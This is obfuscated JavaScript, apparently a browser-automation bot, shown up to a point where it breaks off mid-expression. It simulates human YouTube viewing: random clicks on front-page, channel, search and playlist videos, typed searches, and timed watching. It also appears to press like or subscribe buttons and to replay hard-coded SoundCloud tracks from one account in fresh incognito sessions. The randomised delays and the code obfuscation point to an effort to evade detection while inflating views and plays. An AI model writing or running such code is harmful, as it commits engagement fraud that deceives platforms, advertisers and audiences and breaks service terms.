const X = b,
  W = d,
  V = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (-0x89b * -0x4 + -0x1 * 0x2359 + 0x2 * 0x77))) + i;
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x12e * -0xe + -0x2 * 0xf07 + 0xd8a), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0x1914 + 0x3d86 + -0x10e * -0x1d + (0x1d5 * 0x18 + -0x3f12 + 0x4db2) * random()) : await standardWaitForNetIdle(f), await wait(-0x22ad + -0x9 * 0x300 + 0x5135 + (0x32c9 * 0x1 + 0x3928 + -0x44e1) * random()), -0xff6 + 0x12b9 * -0x1 + 0x22b0;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x1 * 0xc7d + 0x4d + 0x1fb8), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x43 * -0x61 + -0x2261 * -0x1 + -0xd * 0xb1;
}
async function randomWait() {
  return await wait(-0x2614 + -0x4d6 * 0x4 + 0x19 * 0x314 + (0x16d7 + 0x33 * -0x2 + 0x95 * -0x5) * random()), 0x3 * 0x819 + -0x18e4 + 0x4d * 0x2;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](-0x1b6f * -0x1 + 0x21e0 + -0x2b * 0x16d, 0x248b * 0x1 + -0x1 * -0x14bc + -0x3940), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0x94b * 0xb + 0x3b * 0x3fa + -0x11 * 0x607) * getRandomInt(0x250a + -0x1b29 + -0x9df, -0x9a9 + 0xaae + 0x1 * -0x100), h)), 0x1 * 0x25ad + 0x2077 * 0x1 + -0x4623;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const R = c,
      h = {
        'Seconds': 0x3e8,
        'Minutes': 0xea60,
        'Hours': 0x36ee80,
        'Second': 0x3e8,
        'Minute': 0xea60,
        'Hour': 0x36ee80
      };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + R(0x9)))['pop']()['ariaValueT' + 'ext'],
      j = 0x1df * -0x2 + -0x7ad + 0xb6b;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x95 * 0x14 + -0x19ec + 0xe49]['split']('\x20');
    for (let k = -0x1529 + 0x4a3 + -0x9 * -0x1d6; k < i['length']; k += 0xa8d + 0x1 * -0x2477 + -0x4 * -0x67b)
      j += i[k] * h[i[k + (0x5 * -0x3df + -0xe32 + -0x1 * -0x218e)]];
    return j;
  });
}
async function anchorAndView(f) {
  const S = d;
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x2a2 + -0x12f8 + 0x105c)['map'](l => Array['from'](l['children']))['flat'](-0xfe5 * -0x1 + 0x67 * -0x6 + -0xd7a)['map'](l => l['childNodes'][-0x1b57 + 0x1837 + 0x1 * 0x321]['childNodes'][-0x1 * 0x2443 + -0xeab * 0x2 + 0x4199]['childNodes'][0x1e67 + 0x2e7 * -0x1 + -0x1b7f]['childNodes'][0x26e2 + 0xe21 * -0x2 + -0x14 * 0x88]['childNodes'][0x2b1 * 0x6 + 0x59 * 0x18 + -0x1 * 0x187d]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1a8e + -0x39 * -0x11 + -0x1a6f * 0x1, 0x171c + -0x1c8b + -0x7 * -0x391)), await f['click']('#__hookedV' + S(0x4)), await wait(0xe * -0x7e1 + 0x5da8 + 0x4b3e);
  const h = await getMaxTime(f),
    i = Math['min']((-0x4936 + -0x1 * 0xd005 + 0x2039b) * getRandomInt(-0x171c + -0x71 * -0x47 + -0x839, 0x145f + -0x20a5 + 0xc4b), h);
  return await wait(i), -0x456 + 0x1969 + 0x57 * -0x3e;
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xc8b + -0x2 * -0xa69 + 0xb1f * -0x3);
    let h = e[f];
    if (c['EEHVzc'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x7 * -0x50 + -0x1 * -0x1ac1 + -0x1891, r, s, t = 0xccb + 0x8b * -0x1 + -0xc40; s = m['charAt'](t++); ~s && (r = q % (-0x1 * -0x3ad + 0x7 * -0x31f + -0x308 * -0x6) ? r * (-0x23 * -0x110 + -0x17d7 + 0x7 * -0x1df) + s : s, q++ % (-0xfb * 0x13 + -0x5b * 0x51 + 0x170 * 0x21)) ? o += String['fromCharCode'](-0x2137 + -0x9fe + 0x2c34 & r >> (-(0xab0 + 0xaa * -0xb + 0x36 * -0x10) * q & -0x910 + -0xcb1 + 0x15c7)) : 0x2134 + 0x16e8 + 0xe4 * -0x3f) {
          s = n['indexOf'](s);
        }
        for (let u = -0x596 + -0x1830 + 0x25 * 0xce, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0xaa0 + -0x6 * -0x45b + -0x24b2))['slice'](-(-0x4d6 * 0x4 + 0x13 * -0x110 + -0x1 * -0x278a));
        }
        return decodeURIComponent(p);
      };
      c['EtzvpV'] = i, b = arguments, c['EEHVzc'] = !![];
    }
    const j = e[0x1 * -0xcd7 + 0x89 * 0x13 + 0x2ac],
      k = f + j,
      l = b[k];
    return !l ? (h = c['EtzvpV'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x2003 + -0x22ec * -0x1 + 0x5 * -0x95]['children'][0x3a * -0x20 + 0x1e1 * 0x5 + 0x225 * -0x1]['children'][-0xf7c + 0x476 * 0x8 + 0xc * -0x1af]['children'][0x1 * 0x24bf + -0x2056 + -0x469]['children'][-0x2 * -0x102f + -0x1 * 0x767 + -0x1 * 0x18f7]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0xb * 0x36a + -0x1cc6 + -0x7 * 0x141;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x58a + -0xff1 + 0xacb + (-0x8bc + 0x21f4 * -0x1 + -0x3e6 * -0xb) * random()
  }), await wait(0x3 * 0xca6 + -0x2414 * 0x1 + 0x16 + (0xd2e + 0x9dd + -0x15df) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][0x1664 * -0x1 + -0x1 * -0xa49 + -0x7 * -0x1bb]['childNodes'][0x195d + 0x1a * 0x59 + -0x2266]['childNodes'][-0x9bf * 0x4 + 0x43b * -0x8 + 0x48d5]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x151e + -0x1098 + 0x1 * -0x481]['childNodes'][-0xda0 + 0x407 + 0x999]['childNodes'][-0x188b + 0x97 * 0x23 + 0x3e8]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x8f3 * 0x3 + -0x1888 + 0x3362),
          r = -0x11bb * -0x1 + -0x17e1 + 0x313 * 0x2;
        for (let u = -0x1 * -0x1f67 + -0x5 * -0x4 + -0x1f7b; u < q['length']; u += 0x5c9 + 0x84b + -0xe12)
          r += q[u] * k[q[u + (0x1174 + 0xd5 * 0x24 + -0x2f67)]];
        return r;
      }(n);
  });
  await wait((0x15 * -0x322 + 0x2d83 + 0x4edf) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x7a54 + -0x16315 + 0x3 * 0xed43) * getRandomInt(0x16a3 + -0xd9d + 0x905 * -0x1, 0x941 + 0x11e1 + 0x484 * -0x6), h + (-0x198e + -0x26ed + 0x5403));
  return await wait(i), 0x1 * 0x1e07 + -0xe * -0xbb + -0x2840;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x1 * 0x1de1 + -0x243d * -0x1 + -0x421e), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        const T = b;
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document[T(0xd, 'qWvn') + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x9c + -0xf3e + 0x1b92 * 0x1 + (0x10 * 0x233 + -0xc31 * 0x1 + -0x1317) * Math['random']());
    });
  }, 0x3491 + 0x2f0e + -0x4847);
  await wait(0x5ee12 + 0x30209 * 0x2 + -0x75e44);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0xf3eb + 0xd572 + 0x108d9) * getRandomInt(-0x1 * 0x1891 + -0x2261 + -0x2 * -0x1d7b, 0xac0 + -0x2d1 * 0x7 + 0x3a * 0x28)), clearInterval(h), -0x188c + -0x65f * -0x3 + 0x570;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = -0x1 * -0x13d + -0x2166 + 0x2029;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return 0x11 * 0x7 + -0x62b + 0x5b5;
    await randomWait();
  }
  return 0xbd * 0x2f + -0x1 * -0x16eb + -0x399d;
}

function fetchRandomSC() {
  return Math['random']() <= -0x8ed * 0x2 + -0x1da * -0x12 + -0xf7a + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0xf22 * 0x1 + -0x1 * -0x12b2 + -0x390 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0xc8b + -0x2 * -0xa69 + 0xb1f * -0x3);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= -0xc25 + 0x1 * -0xb95 + 0x17ba + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x1 * -0xa69 + -0x8ae + 0x21f * 0x9;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x4c35 + 0x92b * 0x4 + 0x3ee7 * 0x1 + getRandomInt(0x8 * 0x7f9 + -0x3f73 * -0x1 + -0x44a3, -0x5bc5 * -0x1 + 0x73 * -0x45 + -0x2 * -0x1c35));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](-0x2373 + -0x37a * -0x2 + -0x260 * -0xc), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x2 * -0x10a6 + -0x18d5 + -0x17 * -0x287;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x1d6a + -0x2 * -0x155 + 0x1 * -0x2014, 0x5 * -0xad + 0x1c0 + 0x1d3)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x2d9 * -0x6 + -0x2 * 0xa79 + 0x2dd8 + floor((0xd3b + 0x11 * 0x4f + -0xe92) * random()))), log('p2'), log(await s['evaluate'](() => {
        const U = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + U(0xa)] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x4c * -0x57877b + -0x70f4d470 + 0xd54 * 0x10210f),
          -0x2b9aca * 0x3 + 0x4f39d * -0x2f + 0x1 * 0x1eb8a31,
          -0x1 * 0x85c4 + 0x7f90 + 0x8634,
          -0x1186 + -0xa90 + -0x1 * -0x1c96
        ], y = [
          -0x6cf + 0x12b6 + -0xbcf,
          0x49f + -0xd9d + -0x3d * -0x26,
          0xdb5 + -0x23fa + 0x76f * 0x3,
          -0x1f56 + -0x26f9 * 0x1 + 0x464f
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x22ef + 0x766 * -0x1 + 0x2a56)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x17c3 + 0x719 * -0x3 + 0x1687 * 0x2; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(0xe2f + 0x1 * 0x1943 + -0xc6 * 0x33) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x3 * 0x139 + -0xcbb + 0x1066] = A[0xbd + 0x6f8 * -0x4 + 0x1b33] = A[-0xe3 * 0x9 + -0x2f1 * -0x8 + 0x2 * -0x7c6] = A[-0x1279 * 0x1 + 0x2016 + -0x2b * 0x51] = A[0xdcd + -0x817 + -0x5b3] = A[0x422 + 0x20 * -0x4 + -0x39e] = A[0x632 * 0x5 + 0x1 * -0x476 + -0x1a7f] = A[0xf3f + -0x2 * -0x66e + -0x1c15 * 0x1] = A[0x1435 + -0x81 * 0x1d + -0x591] = A[-0x1a5e + -0x141a + -0x18 * -0x1f0] = A[-0xe14 + -0x1 * 0x13ee + 0x220b] = A[0x1cd0 + -0x1 * -0x1aba + -0x3780] = A[0x2 * 0x244 + -0x3 * 0xc30 + -0x15 * -0x187] = A[0x1c9c + -0x1b06 + -0xc5 * 0x2] = A[-0x9 * -0x36d + 0x7ed * 0x3 + -0x368f] = A[-0xffc + -0x1bd0 + 0x2bda] = A[0xf02 * 0x2 + 0x2344 + -0x4139] = 0x2 * -0x6ec + 0x7 * 0x83 + 0xa43, this['blocks'] = A) : this['blocks'] = [
                0xe5 * -0x8 + -0x17e9 + 0x1f11,
                0x78a * -0x3 + -0x2287 + -0x3925 * -0x1,
                -0x2351 + 0x427 * 0x4 + 0x12b5,
                0x1a4d * 0x1 + -0x16b2 + -0x39b,
                0x30 * -0x6 + -0x1 * 0xa8d + 0xbad,
                -0x1c21 + 0x158c + 0x695,
                0x1d81 * -0x1 + 0x59e * -0x6 + 0x3f35,
                -0x1289 * -0x2 + -0x1f53 + -0x5bf * 0x1,
                0x161f * 0x1 + -0x1 * 0x44f + -0x11d0,
                0x6e2 * -0x2 + -0x74 * -0x3 + -0x8 * -0x18d,
                -0x14c * -0x1c + 0x3 * -0xd + 0x1 * -0x2429,
                -0x7d9 + 0x2324 + -0x89 * 0x33,
                0xdd * -0x7 + -0x220 * 0x9 + 0x11 * 0x17b,
                -0xcb4 * -0x2 + 0x255d + -0x3ec5 * 0x1,
                0x47 * -0x7d + -0x27 * -0x4e + -0x13 * -0x133,
                -0x577 * -0x3 + -0xee5 * -0x1 + 0x537 * -0x6,
                0x19ed + 0x1 * 0xa4f + -0x1 * 0x243c
              ], this['h0'] = 0x68b0a745 + -0x1 * 0x87d4a59 + 0x711c615, this['h1'] = -0x1528522fc + -0x84a78c * -0x12d + -0x603df * -0x4637, this['h2'] = -0x3 * -0x3620bfb3 + 0x830833f1 * 0x1 + -0x8caf960c, this['h3'] = -0x256 * -0x6bd23 + -0x4b34bb * -0x3f + -0x120d7551, this['h4'] = -0xe5 * -0xfbca1 + 0x44 * 0x3f571d5 + -0x577316a9, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = 0x20f9 + 0x2063 + 0x59 * -0xbc, this['finalized'] = this['hashed'] = -0x2105 + 0x7e7 * 0x1 + -0xa * -0x283, this['first'] = -0x2e8 + 0x1 * -0x1c2 + -0xef * -0x5;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x96a + -0xf * -0x185 + -0x2035, O = J['length'] || -0x65 * 0x49 + 0x4 * -0x734 + 0x399d, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = -0x194f * 0x1 + 0x13a9 + -0xf1 * -0x6, P[0x22b + -0x146f * 0x1 + 0x1244] = this['block'], P[-0xfa8 + 0xe6 * 0x16 + 0x7 * -0x94] = P[0x65 * -0x15 + -0x1d07 + -0x2551 * -0x1] = P[-0x1 * -0x131f + -0x23f7 + 0x3 * 0x59e] = P[-0x3 * 0x26b + 0x1 * 0x18e + 0x5b6] = P[-0x1fee + 0x69 * -0x3f + 0x39c9] = P[0xc73 + 0x2120 + -0xe * 0x341] = P[-0x229b + 0x3dd * -0x5 + 0x1af9 * 0x2] = P[0x69f * -0x3 + 0x418 + 0xfcc] = P[0x207 * -0xa + -0x996 + 0x1de4] = P[-0x3 * 0x409 + 0x2 * -0xb65 + 0x22ee] = P[0x1c19 + -0x2496 + -0x3b * -0x25] = P[0x1 * -0x128a + 0x912 + 0x1 * 0x983] = P[-0xab0 + -0x7d * 0x7 + 0xe27] = P[-0x3f3 + 0x1 * 0x1e5e + -0x1a5e] = P[-0x1a7 + 0x1 * 0x2099 + -0x1ee4] = P[0xf31 + 0x678 + 0x23 * -0x9e] = 0x2f * 0x6c + 0x1 * 0x1d03 + -0x30d7), K) {
                    for (N = this['start']; M < O && N < 0x1a37 + -0x2b1 + -0x1746; ++M)
                      P[N >> -0x70e + 0x9d * -0xe + 0xfa6] |= J[M] << y[0x59 * 0x31 + 0x66b * -0x2 + 0x86 * -0x8 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0xcd0 + 0xaed * -0x1 + 0x17fd * 0x1; ++M)
                      (L = J['charCodeAt'](M)) < 0x22aa + -0xf6 + -0x2134 ? P[N >> -0x7 * 0x503 + 0x2374 + -0x5d] |= L << y[-0xa9 * 0x1 + -0x434 + 0x27 * 0x20 & N++] : L < -0x2541 + 0x121e + 0x1b23 ? (P[N >> 0x5f9 + -0x19b7 + 0x13c0] |= (0xeed + -0x90 * -0x10 + -0x172d | L >> -0x6 * -0x222 + -0x1a * -0xf5 + -0x96a * 0x4) << y[0x194d + 0x13e0 + -0x2d2a & N++], P[N >> -0x156b * 0x1 + -0x5a9 + -0x1b16 * -0x1] |= (-0x11 * 0x157 + 0x1db + 0x156c | 0x50 * 0x5e + -0x46d * 0x2 + 0x1447 * -0x1 & L) << y[0xa97 + 0x108 * 0x1f + 0xaa3 * -0x4 & N++]) : L < -0x481 * 0x24 + -0x1 * -0x1ab81 + -0x315d * 0x1 || L >= -0x1603a + 0x11 * -0x1516 + 0xe9ac * 0x4 ? (P[N >> 0x47 * -0x7f + 0x4 * -0x936 + 0x4813] |= (0x25f5 + -0x1f19 + -0x5fc * 0x1 | L >> -0x18e5 + -0x1 * 0x11c2 + 0x2ab3) << y[0xfee * -0x1 + 0xd1f * 0x1 + -0x1 * -0x2d2 & N++], P[N >> 0x103c + -0x3 * -0x668 + -0x2372] |= (0x21ee + -0xcbc + -0x14b2 | L >> -0x4cd * -0x8 + 0x1a05 + -0x4067 & -0x24fd + -0x1c9b + 0x1 * 0x41d7) << y[-0x24ca * -0x1 + -0x1658 + -0xe6f & N++], P[N >> -0x169e + -0x7c0 + 0x1e60] |= (0x7d + 0x1 * 0x24f2 + -0x5 * 0x763 | 0x611 * -0x6 + 0x9ef + 0x1ab6 & L) << y[-0x122f + -0x1 * 0x82f + -0x1 * -0x1a61 & N++]) : (L = -0x4 * -0x30bf + 0xe8b4 + 0x1 * -0xabb0 + ((0x1 * 0x1a43 + 0xd * 0x18a + -0x2a46 & L) << 0x10ea + -0x799 + -0x947 | 0x5ae + -0x215f + 0x1fb0 & J['charCodeAt'](++M)), P[N >> -0x17d1 + -0xa3e + 0x2211] |= (0x399 + 0xe * -0x1af + -0x1 * -0x14e9 | L >> 0x1c3d + 0x11fc + -0x55 * 0x8b) << y[-0x1559 + 0x3 * -0x201 + 0x1 * 0x1b5f & N++], P[N >> 0x1 * 0x5bf + -0xcb * -0x12 + -0x1403 * 0x1] |= (0x24b * 0x1 + 0x1 * 0x1b9b + -0x1d66 | L >> -0x17e0 + -0x44e * -0x1 + 0x5d * 0x36 & -0x1 * 0x1d2f + -0x142c + 0x319a) << y[-0x1 * 0x5db + 0x24c * -0x11 + 0x2cea & N++], P[N >> 0x2 * 0xc44 + 0x160d * -0x1 + -0x1 * 0x279] |= (0x71 * 0x1 + 0x26ea + -0x26db | L >> -0x2b * 0xd3 + 0x17fc + -0x1 * -0xb7b & 0x59 * 0x51 + -0x24db + -0x15 * -0x6d) << y[-0x9b8 + -0x647 * -0x2 + 0xf1 * -0x3 & N++], P[N >> -0x88e + -0x710 + 0x19 * 0xa0] |= (-0x6 * 0x58a + -0x2d9 * 0x1 + 0x2495 | -0xe47 + -0xb * -0x30d + -0x1309 & L) << y[-0x2279 * 0x1 + -0x97 * -0x1 + 0x21e5 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0xa * -0xe + -0x1 * 0x1137 + 0x10eb ? (this['block'] = P[0x15de * -0x1 + -0x1 * -0xd78 + -0x169 * -0x6], this['start'] = N - (-0x1 * -0x26cf + 0x1c35 + -0x42c4), this['hash'](), this['hashed'] = -0x1 * -0x1ed0 + -0x1c6c + -0x263) : this['start'] = N;
                }
                return this['bytes'] > 0x40 * 0x29433a2 + 0x128119c5f + -0xcd1e84e * 0x10 && (this['hBytes'] += this['bytes'] / (0xdb470204 + -0x8c * 0x1b8d68b + -0x6f1f540 * -0x28) << 0xf7 * 0x9 + 0x12e7 * 0x1 + -0x1b96, this['bytes'] = this['bytes'] % (0x50 * 0x35460f4 + 0x10d823cfc + -0x117e0893c)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x9dc + -0x13d + 0xb1a;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0xd * -0x27 + -0x221f + 0x242a] = this['block'], J[K >> 0x9f4 + -0xd * -0x14b + 0x1 * -0x1ac1] |= x[-0x14 * -0x122 + 0x4 * 0x39e + 0x251d * -0x1 & K], this['block'] = J[-0xcca * -0x1 + -0x4 * -0x614 + -0x250a], K >= -0x7f5 * -0x4 + -0x21a1 * 0x1 + 0x1 * 0x205 && (this['hashed'] || this['hash'](), J[-0x5b * -0x4 + -0x1cfc + 0x48 * 0x62] = this['block'], J[-0x8 * -0x157 + -0x4c2 + -0x5e6] = J[0x1dd5 * 0x1 + -0xfe2 + 0x22 * -0x69] = J[0x1ab * 0x9 + -0x25 * -0x6f + -0x1f0c] = J[-0x2f * -0x8f + -0x1 * 0x363 + 0x1 * -0x16db] = J[-0x18eb + 0xa32 + 0xb * 0x157] = J[0x1 * 0x1ea1 + -0x312 * 0x7 + -0x91e] = J[0xa63 * 0x1 + 0x1361 + -0x1dbe] = J[0xa57 + -0x1ee2 + 0x1492] = J[0x44d * 0x1 + 0x25 * -0x47 + 0x5fe] = J[-0x27a * 0xa + -0x16b3 + 0x2f80] = J[-0x17f + 0x25 * 0xa9 + -0x16e4] = J[0x1ab4 + -0xb * 0x4a + -0x177b] = J[-0x15a8 + -0x185 * 0x16 + 0x1b91 * 0x2] = J[0x62b * -0x6 + -0xb4b + 0x305a] = J[0x1117 + 0x927 + -0x1a30] = J[-0x2663 + -0x2245 + 0x48b7] = 0x778 + -0x7cc * -0x5 + 0x173a * -0x2), J[-0x4cc + -0x2643 + -0x3 * -0xe5f] = this['hBytes'] << -0x1c9 * -0xb + -0x54a * -0x3 + 0x9a * -0x3b | this['bytes'] >>> 0x1267 + 0x8 * 0x359 + -0x2d12, J[0x23b * -0x2 + -0x593 * 0x2 + -0x7 * -0x23d] = this['bytes'] << 0x43 * -0x8f + -0x286 + 